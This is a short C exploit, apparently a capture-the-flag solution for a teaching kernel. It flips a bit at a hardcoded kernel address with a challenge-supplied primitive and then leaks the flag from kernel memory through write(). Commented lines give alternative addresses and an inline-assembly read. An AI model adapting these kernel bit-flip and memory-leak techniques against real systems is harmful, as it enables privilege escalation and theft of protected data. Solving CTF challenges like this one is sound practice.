// On the server, only this file will be executed.
#include "stdio.h"
#include "nonstd.h"
#include "sched.h"
#include "unistd.h"

int main(int argc, char** argv)
{
    printf("Your exploit here\n");

    // These addresses work for the kernel compiled from dist/ directory
    // which is the same as the remote version in the CTF
    void *flag_addr = (void *)0xffffffff8013294d;
    void *jmp_addr = (void *)0xffffffff8010a775;

    printf("a pointer: %p\n", &flag_addr);

    flipBit(jmp_addr, 6);
    write(1, flag_addr, 100);

    // These 2 lines work on the version compile with symbols from the sweb/ directory
    // flipBit((void *)0xffffffff8010a8b9, 6);
    // write(1, (void *)0xffffffff80132f35, 100);

    // initial idea of reading the flag after making kernel pages user-accessible:
    // unsigned long long flag = 0;
    // asm("mov $0xffffffff80132f35, %%rax;"
    //     "mov (%%rax), %0;"
    //     : "=r" (flag)
    //     :: "%rax"
    // );
    // printf("flag = %llx", flag);

    printf("Still alive!\n");
}